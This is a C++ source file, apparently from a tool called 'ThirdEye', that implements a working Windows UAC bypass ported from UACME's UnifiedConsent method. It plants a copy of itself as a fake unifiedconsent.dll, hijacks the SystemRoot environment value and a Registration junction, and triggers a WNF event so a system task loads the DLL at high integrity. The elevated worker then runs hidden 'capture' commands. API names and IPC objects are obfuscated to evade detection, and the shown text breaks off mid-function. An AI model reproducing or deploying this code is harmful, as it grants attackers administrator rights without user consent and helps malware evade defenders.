// Method 83 (UnifiedConsent) UAC auto-elevation, self-embedded variant.
//
// Port of UACME ucmUnifiedConsentMethod / ucmRegistrationProxyExecute
// (R41N3RZUF477, https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass).
//
// Bootstrap (once):
//   1. %TEMP%\Registration junction -> %SystemRoot%\Registration
//   2. %TEMP%\System32\unifiedconsent.dll <- a copy of THIS module
//   3. HKCU\Environment\SystemRoot -> %TEMP%
//   4. WNF WNF_UC_CONSENT_ITEM_CHANGED -> taskhostw loads plant at high IL
//   5. DllMain spawns rundll32 entry on winsta0\default
//   6. Worker opens IPC, signals READY, stays resident
//
// Hot path (~ms): fill shm → SetEvent(cmd) → WaitForSingleObject(done).

#include "internal.h"
#include "dynresolve.h"
#include "lge_syscalls.h"

#include <cstdio>

namespace {

#define WNF_UC_CONSENT_ITEM_CHANGED 0x41C60D38A3BC0875ULL
#define UC83_WAIT_MS 15000
#ifndef SDDL_REVISION_1
#define SDDL_REVISION_1 1
#endif

typedef struct _WNF_STATE_NAME {
    ULONG Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME;

typedef NTSTATUS(NTAPI* pNtUpdateWnfStateData)(
    PWNF_STATE_NAME, const void*, ULONG, const void*, const void*, ULONG, ULONG);
typedef NTSTATUS(NTAPI* pNtQueryWnfStateNameInformation)(
    PWNF_STATE_NAME, ULONG, const void*, void*, ULONG);
typedef NTSTATUS(NTAPI* pNtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

#define WNF_INFO_STATE_NAME_EXIST 0
#define WNF_INFO_SUBSCRIBERS_PRESENT 1

struct Uc83Apis {
    pNtUpdateWnfStateData NtUpdateWnfStateData;
    pNtQueryWnfStateNameInformation NtQueryWnfStateNameInformation;
    pNtCreateFile NtCreateFile;
    pRtlInitUnicodeString RtlInitUnicodeString;
    bool ready;
};

const Uc83Apis& GetUc83Apis() {
    static Uc83Apis a = []() {
        Uc83Apis r = {};
        HMODULE hNt = GetNtdllHandle();
        if (!hNt) return r;
        static constexpr auto oUpd = MAKE_OBF("NtUpdateWnfStateData");
        static constexpr auto oQry = MAKE_OBF("NtQueryWnfStateNameInformation");
        static constexpr auto oCreateFile = MAKE_OBF("NtCreateFile");
        static constexpr auto oRlus = MAKE_OBF("RtlInitUnicodeString");
        r.NtUpdateWnfStateData = ResolveApiT<pNtUpdateWnfStateData>(hNt, DECR_STR(oUpd));
        r.NtQueryWnfStateNameInformation = ResolveApiT<pNtQueryWnfStateNameInformation>(hNt, DECR_STR(oQry));
        r.NtCreateFile = ResolveApiT<pNtCreateFile>(hNt, DECR_STR(oCreateFile));
        r.RtlInitUnicodeString = ResolveApiT<pRtlInitUnicodeString>(hNt, DECR_STR(oRlus));
        r.ready = r.NtUpdateWnfStateData && r.NtQueryWnfStateNameInformation &&
                  r.NtCreateFile && r.RtlInitUnicodeString;
        return r;
    }();
    return a;
}

typedef LSTATUS(WINAPI* pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS(WINAPI* pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LSTATUS(WINAPI* pRegDeleteValueW)(HKEY, LPCWSTR);
typedef LSTATUS(WINAPI* pRegFlushKey)(HKEY);
typedef LSTATUS(WINAPI* pRegCloseKey)(HKEY);
typedef BOOL(WINAPI* pConvertStringSecurityDescriptorToSecurityDescriptorA)(
    LPCSTR, DWORD, PSECURITY_DESCRIPTOR*, PULONG);
typedef BOOL(WINAPI* pInitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR, DWORD);
typedef BOOL(WINAPI* pSetSecurityDescriptorDacl)(PSECURITY_DESCRIPTOR, BOOL, PACL, BOOL);

// Only the plant/elevation-sensitive kernel32 APIs are resolved dynamically.
// Mundane sync/file helpers stay on the static KERNEL32 import (already required).
typedef BOOL(WINAPI* pCreateDirectoryW)(LPCWSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL(WINAPI* pRemoveDirectoryW)(LPCWSTR);
typedef BOOL(WINAPI* pCopyFileW)(LPCWSTR, LPCWSTR, BOOL);
typedef BOOL(WINAPI* pDeleteFileW)(LPCWSTR);
typedef DWORD(WINAPI* pGetTempPathW)(DWORD, LPWSTR);
typedef UINT(WINAPI* pGetSystemWindowsDirectoryW)(LPWSTR, UINT);
typedef BOOL(WINAPI* pDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI* pTerminateProcess)(HANDLE, UINT);

typedef LRESULT(WINAPI* pSendMessageTimeoutW)(HWND, UINT, WPARAM, LPARAM, UINT, UINT, PDWORD_PTR);

struct AdvApis {
    pRegOpenKeyExW RegOpenKeyExW;
    pRegSetValueExW RegSetValueExW;
    pRegDeleteValueW RegDeleteValueW;
    pRegFlushKey RegFlushKey;
    pRegCloseKey RegCloseKey;
    pConvertStringSecurityDescriptorToSecurityDescriptorA ConvertSd;
    pInitializeSecurityDescriptor InitializeSecurityDescriptor;
    pSetSecurityDescriptorDacl SetSecurityDescriptorDacl;
    bool ready;
};

struct K32Apis {
    pCreateDirectoryW CreateDirectoryW;
    pRemoveDirectoryW RemoveDirectoryW;
    pCopyFileW CopyFileW;
    pDeleteFileW DeleteFileW;
    pGetTempPathW GetTempPathW;
    pGetSystemWindowsDirectoryW GetSystemWindowsDirectoryW;
    pDeviceIoControl DeviceIoControl;
    pOpenProcess OpenProcess;
    pTerminateProcess TerminateProcess;
    bool ready;
};

struct U32Apis {
    pSendMessageTimeoutW SendMessageTimeoutW;
    bool ready;
};

const AdvApis& GetAdvApis() {
    static AdvApis a = []() {
        AdvApis r = {};
        static constexpr auto obfAdv = MAKE_OBF("advapi32.dll");
        HMODULE h = DynGetOrLoad(DECR_STR(obfAdv));
        if (!h) return r;
        static constexpr auto oOpen = MAKE_OBF("RegOpenKeyExW");
        static constexpr auto oSet = MAKE_OBF("RegSetValueExW");
        static constexpr auto oDel = MAKE_OBF("RegDeleteValueW");
        static constexpr auto oFlush = MAKE_OBF("RegFlushKey");
        static constexpr auto oClose = MAKE_OBF("RegCloseKey");
        static constexpr auto oCvt = MAKE_OBF("ConvertStringSecurityDescriptorToSecurityDescriptorA");
        static constexpr auto oInit = MAKE_OBF("InitializeSecurityDescriptor");
        static constexpr auto oDacl = MAKE_OBF("SetSecurityDescriptorDacl");
        r.RegOpenKeyExW = ResolveApiT<pRegOpenKeyExW>(h, DECR_STR(oOpen));
        r.RegSetValueExW = ResolveApiT<pRegSetValueExW>(h, DECR_STR(oSet));
        r.RegDeleteValueW = ResolveApiT<pRegDeleteValueW>(h, DECR_STR(oDel));
        r.RegFlushKey = ResolveApiT<pRegFlushKey>(h, DECR_STR(oFlush));
        r.RegCloseKey = ResolveApiT<pRegCloseKey>(h, DECR_STR(oClose));
        r.ConvertSd = ResolveApiT<pConvertStringSecurityDescriptorToSecurityDescriptorA>(h, DECR_STR(oCvt));
        r.InitializeSecurityDescriptor = ResolveApiT<pInitializeSecurityDescriptor>(h, DECR_STR(oInit));
        r.SetSecurityDescriptorDacl = ResolveApiT<pSetSecurityDescriptorDacl>(h, DECR_STR(oDacl));
        r.ready = r.RegOpenKeyExW && r.RegSetValueExW && r.RegDeleteValueW &&
                  r.RegFlushKey && r.RegCloseKey && r.ConvertSd &&
                  r.InitializeSecurityDescriptor && r.SetSecurityDescriptorDacl;
        return r;
    }();
    return a;
}

const K32Apis& GetK32Apis() {
    static K32Apis a = []() {
        K32Apis r = {};
        static constexpr auto obfK = MAKE_OBF("kernel32.dll");
        HMODULE h = DynGetOrLoad(DECR_STR(obfK));
        if (!h) return r;
        static constexpr auto oCd = MAKE_OBF("CreateDirectoryW");
        static constexpr auto oRd = MAKE_OBF("RemoveDirectoryW");
        static constexpr auto oCp = MAKE_OBF("CopyFileW");
        static constexpr auto oDf = MAKE_OBF("DeleteFileW");
        static constexpr auto oTp = MAKE_OBF("GetTempPathW");
        static constexpr auto oSw = MAKE_OBF("GetSystemWindowsDirectoryW");
        static constexpr auto oDio = MAKE_OBF("DeviceIoControl");
        static constexpr auto oOp = MAKE_OBF("OpenProcess");
        static constexpr auto oTm = MAKE_OBF("TerminateProcess");
        r.CreateDirectoryW = ResolveApiT<pCreateDirectoryW>(h, DECR_STR(oCd));
        r.RemoveDirectoryW = ResolveApiT<pRemoveDirectoryW>(h, DECR_STR(oRd));
        r.CopyFileW = ResolveApiT<pCopyFileW>(h, DECR_STR(oCp));
        r.DeleteFileW = ResolveApiT<pDeleteFileW>(h, DECR_STR(oDf));
        r.GetTempPathW = ResolveApiT<pGetTempPathW>(h, DECR_STR(oTp));
        r.GetSystemWindowsDirectoryW = ResolveApiT<pGetSystemWindowsDirectoryW>(h, DECR_STR(oSw));
        r.DeviceIoControl = ResolveApiT<pDeviceIoControl>(h, DECR_STR(oDio));
        r.OpenProcess = ResolveApiT<pOpenProcess>(h, DECR_STR(oOp));
        r.TerminateProcess = ResolveApiT<pTerminateProcess>(h, DECR_STR(oTm));
        r.ready = r.CreateDirectoryW && r.RemoveDirectoryW && r.CopyFileW && r.DeleteFileW &&
                  r.GetTempPathW && r.GetSystemWindowsDirectoryW && r.DeviceIoControl &&
                  r.OpenProcess && r.TerminateProcess;
        return r;
    }();
    return a;
}

const U32Apis& GetU32Apis() {
    static U32Apis a = []() {
        U32Apis r = {};
        static constexpr auto obfU = MAKE_OBF("user32.dll");
        HMODULE h = DynGetOrLoad(DECR_STR(obfU));
        if (!h) return r;
        static constexpr auto o = MAKE_OBF("SendMessageTimeoutW");
        r.SendMessageTimeoutW = ResolveApiT<pSendMessageTimeoutW>(h, DECR_STR(o));
        r.ready = r.SendMessageTimeoutW != nullptr;
        return r;
    }();
    return a;
}

// Bland IPC names (shredded; must match TeSessionMain open sites).
static constexpr auto kIpcMap = MAKE_OBF("Local\\CssCacheMap");
static constexpr auto kIpcCmd = MAKE_OBF("Local\\CssCacheCmd");
static constexpr auto kIpcDone = MAKE_OBF("Local\\CssCacheDone");
static constexpr auto kIpcReady = MAKE_OBF("Local\\CssCacheReady");

static void FillRegDbDir(wchar_t* out, size_t n) {
    static constexpr auto o = MAKE_OBF("\\Registration");
    TeAsciiToWide(out, n, DECR_STR(o));
}
static void FillSystem32Sub(wchar_t* out, size_t n) {
    static constexpr auto o = MAKE_OBF("\\System32");
    TeAsciiToWide(out, n, DECR_STR(o));
}
static void FillProxyDll(wchar_t* out, size_t n) {
    static constexpr auto o = MAKE_OBF("\\unifiedconsent.dll");
    TeAsciiToWide(out, n, DECR_STR(o));
}
static void FillSystemRootName(wchar_t* out, size_t n) {
    static constexpr auto o = MAKE_OBF("SystemRoot");
    TeAsciiToWide(out, n, DECR_STR(o));
}
static void FillEnvironmentName(wchar_t* out, size_t n) {
    static constexpr auto o = MAKE_OBF("Environment");
    TeAsciiToWide(out, n, DECR_STR(o));
}
static void FillNtDosPrefix(wchar_t* out, size_t n) {
    static constexpr auto o = MAKE_OBF("\\??\\");
    TeAsciiToWide(out, n, DECR_STR(o));
}

bool TriggerUnifiedConsentWnf(const Uc83Apis& a) {
    WNF_STATE_NAME state;
    state.Data[0] = (ULONG)(WNF_UC_CONSENT_ITEM_CHANGED & 0xFFFFFFFFULL);
    state.Data[1] = (ULONG)(WNF_UC_CONSENT_ITEM_CHANGED >> 32);

    ULONG info = 0;
    if (!NT_SUCCESS(a.NtQueryWnfStateNameInformation(&state, WNF_INFO_STATE_NAME_EXIST,
            nullptr, &info, sizeof(info)))) {
        return false;
    }
    info = 0;
    if (!NT_SUCCESS(a.NtQueryWnfStateNameInformation(&state, WNF_INFO_SUBSCRIBERS_PRESENT,
            nullptr, &info, sizeof(info)))) {
        return false;
    }
    return NT_SUCCESS(a.NtUpdateWnfStateData(&state, nullptr, 0, nullptr, nullptr, 0, 0));
}

bool Win32ToNtPath(const wchar_t* win32, wchar_t* ntOut, size_t ntOutChars) {
    typedef ULONG(NTAPI* pRtlGetFullPathName_U)(PCWSTR, ULONG, PWSTR, PWSTR*);
    static pRtlGetFullPathName_U fn = []() {
        static constexpr auto o = MAKE_OBF("RtlGetFullPathName_U");
        return ResolveApiT<pRtlGetFullPathName_U>(GetNtdllHandle(), DECR_STR(o));
    }();
    if (!fn) return false;

    wchar_t full[MAX_PATH * 2];
    if (fn(win32, (ULONG)(sizeof(full)), full, nullptr) == 0) return false;

    wchar_t prefix[8];
    FillNtDosPrefix(prefix, 8);
    size_t pl = wcslen(prefix), fl = wcslen(full);
    if (pl + fl + 1 > ntOutChars) return false;
    memcpy(ntOut, prefix, pl * sizeof(wchar_t));
    memcpy(ntOut + pl, full, (fl + 1) * sizeof(wchar_t));
    return true;
}

bool CreateRegistrationJunction(const Uc83Apis& a, const wchar_t* tempDir) {
    const K32Apis& k = GetK32Apis();
    if (!k.ready) return false;

    wchar_t regDir[32];
    FillRegDbDir(regDir, 32);

    wchar_t linkWin32[MAX_PATH * 2];
    swprintf(linkWin32, MAX_PATH * 2, L"%ls%ls", tempDir, regDir);

    if (!k.CreateDirectoryW(linkWin32, nullptr)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) return false;
    }

    wchar_t linkNt[MAX_PATH * 2];
    if (!Win32ToNtPath(linkWin32, linkNt, MAX_PATH * 2)) return false;

    wchar_t sysRoot[MAX_PATH];
    UINT n = k.GetSystemWindowsDirectoryW(sysRoot, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return false;

    wchar_t prefix[8];
    FillNtDosPrefix(prefix, 8);
    wchar_t targetPath[MAX_PATH * 2];
    swprintf(targetPath, MAX_PATH * 2, L"%ls%ls%ls", prefix, sysRoot, regDir);

    UNICODE_STRING usName;
    a.RtlInitUnicodeString(&usName, linkNt);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &usName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    HANDLE hDir = nullptr;
    IO_STATUS_BLOCK iosb = {};
    NTSTATUS st = a.NtCreateFile(&hDir,
        GENERIC_WRITE | SYNCHRONIZE,
        &oa, &iosb, nullptr, FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT,
        nullptr, 0);
    if (!NT_SUCCESS(st) || !hDir) return false;

    const size_t targetBytes = (wcslen(targetPath) + 1) * sizeof(wchar_t);
    wchar_t printName[MAX_PATH * 2];
    swprintf(printName, MAX_PATH * 2, L"%ls%ls", sysRoot, regDir);
    const size_t printBytes = (wcslen(printName) + 1) * sizeof(wchar_t);

    size_t bufSize = FIELD_OFFSET(TE_REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) +
        targetBytes + printBytes;
    uint8_t* buf = (uint8_t*)calloc(1, bufSize);
    if (!buf) { CloseHandle(hDir); return false; }

    TE_REPARSE_DATA_BUFFER* rdb = (TE_REPARSE_DATA_BUFFER*)buf;
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)(bufSize - FIELD_OFFSET(TE_REPARSE_DATA_BUFFER, MountPointReparseBuffer));
    rdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)(targetBytes - sizeof(wchar_t));
    rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)targetBytes;
    rdb->MountPointReparseBuffer.PrintNameLength = (USHORT)(printBytes - sizeof(wchar_t));
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, targetPath, targetBytes);
    memcpy((uint8_t*)rdb->MountPointReparseBuffer.PathBuffer + targetBytes, printName, printBytes);

    DWORD returned = 0;
    BOOL ok = k.DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, buf, (DWORD)bufSize,
        nullptr, 0, &returned, nullptr);

    free(buf);
    CloseHandle(hDir);
    return ok == TRUE;
}

void DeleteRegistrationJunction(const wchar_t* tempDir) {
    const K32Apis& k = GetK32Apis();
    if (!k.ready) return;

    wchar_t regDir[32];
    FillRegDbDir(regDir, 32);
    wchar_t linkPath[MAX_PATH * 2];
    swprintf(linkPath, MAX_PATH * 2, L"%ls%ls", tempDir, regDir);

    HANDLE hDir = CreateFileW(linkPath, GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, nullptr);
    if (hDir != INVALID_HANDLE_VALUE) {
        REPARSE_GUID_DATA_BUFFER rgdb = {};
        rgdb.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
        DWORD returned = 0;
        k.DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &rgdb,
            REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, nullptr, 0, &returned, nullptr);
        CloseHandle(hDir);
    }
    k.RemoveDirectoryW(linkPath);
}

// broadcast=true notifies top-level windows that HKCU\Environment changed.
// HWND_BROADCAST wait is *per window* — never use SMTO_BLOCK with a large
// timeout (N hung windows ⇒ N seconds). Cleanup does not need a broadcast.
bool SetVolatileSystemRoot(const wchar_t* valueOrNull, bool broadcast) {
    const AdvApis& adv = GetAdvApis();
    const U32Apis& u32 = GetU32Apis();
    if (!adv.ready) return false;

    wchar_t envName[32];
    FillEnvironmentName(envName, 32);
    wchar_t rootName[32];
    FillSystemRootName(rootName, 32);

    HKEY hKey = nullptr;
    if (adv.RegOpenKeyExW(HKEY_CURRENT_USER, envName, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    LSTATUS st;
    if (valueOrNull) {
        st = adv.RegSetValueExW(hKey, rootName, 0, REG_SZ,
            (const BYTE*)valueOrNull, (DWORD)((wcslen(valueOrNull) + 1) * sizeof(wchar_t)));
    } else {
        st = adv.RegDeleteValueW(hKey, rootName);
        if (st == ERROR_FILE_NOT_FOUND) st = ERROR_SUCCESS;
    }
    adv.RegFlushKey(hKey);
    adv.RegCloseKey(hKey);
    if (st == ERROR_SUCCESS && broadcast && u32.ready) {
        // lParam must be "Environment" (not the value name). Abort hung HWNDs;
        // 100ms is enough for Explorer to refresh before we trigger WNF.
        u32.SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
            (LPARAM)envName, SMTO_ABORTIFHUNG, 100, nullptr);
    }
    return st == ERROR_SUCCESS;
}

bool GetSelfModulePath(wchar_t* out, DWORD outLen) {
    HMODULE hSelf = nullptr;
    if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
            (LPCWSTR)&GetSelfModulePath, &hSelf) || !hSelf) {
        return false;
    }
    DWORD n = GetModuleFileNameW(hSelf, out, outLen);
    return n > 0 && n < outLen;
}

struct ElevIpc {
    HANDLE hMap = nullptr;
    THIRDEYE_ELEVATED_SHM* shm = nullptr;
    HANDLE hCmd = nullptr;
    HANDLE hDone = nullptr;
    HANDLE hReady = nullptr;
    PSECURITY_DESCRIPTOR pSd = nullptr;
};

ElevIpc& GetElevIpc() {
    static ElevIpc ipc;
    return ipc;
}

bool BuildLowLabelSa(SECURITY_ATTRIBUTES* sa, PSECURITY_DESCRIPTOR* ppSd) {
    const AdvApis& adv = GetAdvApis();
    *ppSd = nullptr;
    if (!adv.ready) return false;
    static constexpr auto oSddl = MAKE_OBF("D:(A;;GA;;;WD)S:(ML;;NW;;;LW)");
    if (!adv.ConvertSd(DECR_STR(oSddl), SDDL_REVISION_1, ppSd, nullptr) || !*ppSd) {
        return false;
    }
    sa->nLength = sizeof(*sa);
    sa->bInheritHandle = FALSE;
    sa->lpSecurityDescriptor = *ppSd;
    return true;
}

bool WorkerProcessAlive(DWORD pid) {
    const K32Apis& k = GetK32Apis();
    if (!pid || !k.ready) return false;
    HANDLE h = k.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return false;
    DWORD code = 0;
    BOOL ok = GetExitCodeProcess(h, &code);
    CloseHandle(h);
    return ok && code == STILL_ACTIVE;
}

bool EnsureIpcCreated() {
    const K32Apis& k = GetK32Apis();
    const AdvApis& adv = GetAdvApis();
    if (!k.ready) return false;

    ElevIpc& ipc = GetElevIpc();
    if (ipc.shm && ipc.hCmd && ipc.hDone && ipc.hReady) return true;

    SECURITY_ATTRIBUTES sa = {};
    if (!BuildLowLabelSa(&sa, &ipc.pSd)) {
        static SECURITY_DESCRIPTOR sd;
        if (!adv.ready ||
            !adv.InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION) ||
            !adv.SetSecurityDescriptorDacl(&sd, TRUE, nullptr, FALSE)) {
            return false;
        }
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = FALSE;
        sa.lpSecurityDescriptor = &sd;
    }

    // Hold Revealed locals for the whole function — do not pass DECR_STR()
    // straight into Win32 (some call sites extend past the full-expression).
    shred_detail::Revealed<sizeof(kIpcMap.data) + 1> mapName(kIpcMap);
    shred_detail::Revealed<sizeof(kIpcCmd.data) + 1> cmdName(kIpcCmd);
    shred_detail::Revealed<sizeof(kIpcDone.data) + 1> doneName(kIpcDone);
    shred_detail::Revealed<sizeof(kIpcReady.data) + 1> readyName(kIpcReady);

    if (!ipc.hMap) {
        SetLastError(0);
        ipc.hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, &sa, PAGE_READWRITE,
            0, (DWORD)sizeof(THIRDEYE_ELEVATED_SHM), mapName.c_str());
        if (!ipc.hMap) return false;
        const bool createdNew = (GetLastError() != ERROR_ALREADY_EXISTS);
        ipc.shm = (THIRDEYE_ELEVATED_SHM*)MapViewOfFile(
            ipc.hMap, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(THIRDEYE_ELEVATED_SHM));
        if (!ipc.shm) return false;
        if (createdNew) ZeroMemory(ipc.shm, sizeof(*ipc.shm));
    }
    if (!ipc.shm) {
        ipc.shm = (THIRDEYE_ELEVATED_SHM*)MapViewOfFile(
            ipc.hMap, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(THIRDEYE_ELEVATED_SHM));
        if (!ipc.shm) return false;
    }
    if (!ipc.hCmd) {
        ipc.hCmd = CreateEventA(&sa, FALSE, FALSE, cmdName.c_str());
        if (!ipc.hCmd) return false;
    }
    if (!ipc.hDone) {
        ipc.hDone = CreateEventA(&sa, FALSE, FALSE, doneName.c_str());
        if (!ipc.hDone) return false;
    }
    if (!ipc.hReady) {
        ipc.hReady = CreateEventA(&sa, TRUE, FALSE, readyName.c_str());
        if (!ipc.hReady) return false;
    }
    return true;
}

bool BootstrapElevatedWorker() {
    const Uc83Apis& a = GetUc83Apis();
    const K32Apis& k = GetK32Apis();
    if (!a.ready || !k.ready) return false;
    if (!EnsureIpcCreated()) return false;

    ElevIpc& ipc = GetElevIpc();
    ResetEvent(ipc.hReady);
    InterlockedExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_IDLE);
    ipc.shm->helperPid = 0;
    ipc.shm->cmd = THIRDEYE_ELEV_CMD_NONE;

    wchar_t tempDir[MAX_PATH];
    DWORD n = k.GetTempPathW(MAX_PATH, tempDir);
    if (n == 0 || n > MAX_PATH) return false;
    size_t tl = wcslen(tempDir);
    if (tl && tempDir[tl - 1] == L'\\') tempDir[tl - 1] = 0;

    wchar_t selfPath[MAX_PATH];
    if (!GetSelfModulePath(selfPath, MAX_PATH)) return false;

    bool junctionOk = false, envOk = false;
    bool result = false;

    wchar_t sys32Sub[32];
    FillSystem32Sub(sys32Sub, 32);
    wchar_t proxyDll[64];
    FillProxyDll(proxyDll, 64);

    do {
        DeleteRegistrationJunction(tempDir);
        if (!CreateRegistrationJunction(a, tempDir)) break;
        junctionOk = true;

        wchar_t sys32Dir[MAX_PATH * 2];
        swprintf(sys32Dir, MAX_PATH * 2, L"%ls%ls", tempDir, sys32Sub);
        if (!k.CreateDirectoryW(sys32Dir, nullptr)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS) break;
        }

        wchar_t proxyPath[MAX_PATH * 2];
        swprintf(proxyPath, MAX_PATH * 2, L"%ls%ls%ls", tempDir, sys32Sub, proxyDll);
        if (!k.CopyFileW(selfPath, proxyPath, FALSE)) break;

        if (!SetVolatileSystemRoot(tempDir, true)) break;
        envOk = true;

        if (!TriggerUnifiedConsentWnf(a)) break;

        DWORD wr = WaitForSingleObject(ipc.hReady, UC83_WAIT_MS);
        if (wr == WAIT_OBJECT_0 &&
            WorkerProcessAlive(ipc.shm->helperPid) &&
            InterlockedCompareExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_READY,
                THIRDEYE_ELEV_STATUS_READY) == THIRDEYE_ELEV_STATUS_READY) {
            result = true;
        } else if (wr == WAIT_OBJECT_0 && WorkerProcessAlive(ipc.shm->helperPid)) {
            result = true;
        }
    } while (false);

    // Undo hijack without another HWND_BROADCAST (worker already spawned).
    if (envOk) SetVolatileSystemRoot(nullptr, false);
    if (junctionOk) DeleteRegistrationJunction(tempDir);
    return result;
}

} // namespace

bool Uc83EnsureElevatedWorker(void) {
    const K32Apis& k = GetK32Apis();
    if (!EnsureIpcCreated()) return false;
    ElevIpc& ipc = GetElevIpc();
    if (WorkerProcessAlive(ipc.shm->helperPid) &&
        WaitForSingleObject(ipc.hReady, 0) == WAIT_OBJECT_0) {
        return true;
    }
    return BootstrapElevatedWorker();
}

bool Uc83RequestElevatedCapture(const wchar_t* absPath, DWORD format, DWORD quality, DWORD inclusive) {
    const K32Apis& k = GetK32Apis();
    if (!absPath || !*absPath || !k.ready) return false;
    if (!Uc83EnsureElevatedWorker()) return false;

    ElevIpc& ipc = GetElevIpc();
    if (!WorkerProcessAlive(ipc.shm->helperPid)) {
        if (!BootstrapElevatedWorker()) return false;
    }

    ResetEvent(ipc.hDone);

    lstrcpynW(ipc.shm->outPath, absPath, MAX_PATH);
    ipc.shm->format = format;
    ipc.shm->quality = quality;
    ipc.shm->inclusive = inclusive ? 1u : 0u;
    InterlockedExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_IDLE);
    InterlockedExchange(&ipc.shm->cmd, THIRDEYE_ELEV_CMD_CAPTURE);

    if (!SetEvent(ipc.hCmd)) return false;

    DWORD wr = WaitForSingleObject(ipc.hDone, 5000);
    if (wr != WAIT_OBJECT_0) {
        if (!WorkerProcessAlive(ipc.shm->helperPid)) {
            ipc.shm->helperPid = 0;
            ResetEvent(ipc.hReady);
        }
        return false;
    }
    return InterlockedCompareExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_OK,
        THIRDEYE_ELEV_STATUS_OK) == THIRDEYE_ELEV_STATUS_OK;
}

static void TryDeletePlantedProxy() {
    const K32Apis& k = GetK32Apis();
    if (!k.ready) return;

    wchar_t tempDir[MAX_PATH];
    DWORD n = k.GetTempPathW(MAX_PATH, tempDir);
    if (n == 0 || n > MAX_PATH) return;
    size_t tl = wcslen(tempDir);
    if (tl && tempDir[tl - 1] == L'\\') tempDir[tl - 1] = 0;

    wchar_t sys32Sub[32];
    FillSystem32Sub(sys32Sub, 32);
    wchar_t proxyDll[64];
    FillProxyDll(proxyDll, 64);

    wchar_t proxyPath[MAX_PATH * 2];
    swprintf(proxyPath, MAX_PATH * 2, L"%ls%ls%ls", tempDir, sys32Sub, proxyDll);
    k.DeleteFileW(proxyPath);

    wchar_t sys32Dir[MAX_PATH * 2];
    swprintf(sys32Dir, MAX_PATH * 2, L"%ls%ls", tempDir, sys32Sub);
    k.RemoveDirectoryW(sys32Dir);
}

bool Uc83ShutdownElevatedWorker(void) {
    const K32Apis& k = GetK32Apis();
    if (!k.ready) return false;

    ElevIpc& ipc = GetElevIpc();
    if (!ipc.shm || !ipc.hCmd) {
        if (!EnsureIpcCreated()) return true;
    }

    const DWORD pid = ipc.shm->helperPid;
    if (!pid || !WorkerProcessAlive(pid)) {
        ipc.shm->helperPid = 0;
        InterlockedExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_IDLE);
        InterlockedExchange(&ipc.shm->cmd, THIRDEYE_ELEV_CMD_NONE);
        if (ipc.hReady) ResetEvent(ipc.hReady);
        TryDeletePlantedProxy();
        return true;
    }

    ResetEvent(ipc.hDone);
    InterlockedExchange(&ipc.shm->cmd, THIRDEYE_ELEV_CMD_SHUTDOWN);
    if (!SetEvent(ipc.hCmd)) return false;

    HANDLE hProc = k.OpenProcess(SYNCHRONIZE, FALSE, pid);
    bool gone = false;
    if (hProc) {
        DWORD wr = WaitForSingleObject(hProc, 3000);
        if (wr != WAIT_OBJECT_0) {
            HANDLE hKill = k.OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (hKill) {
                k.TerminateProcess(hKill, 0);
                CloseHandle(hKill);
            }
            WaitForSingleObject(hProc, 2000);
        }
        gone = (WaitForSingleObject(hProc, 0) == WAIT_OBJECT_0);
        CloseHandle(hProc);
    } else {
        WaitForSingleObject(ipc.hDone, 3000);
        gone = !WorkerProcessAlive(pid);
    }

    ipc.shm->helperPid = 0;
    InterlockedExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_IDLE);
    InterlockedExchange(&ipc.shm->cmd, THIRDEYE_ELEV_CMD_NONE);
    if (ipc.hReady) ResetEvent(ipc.hReady);
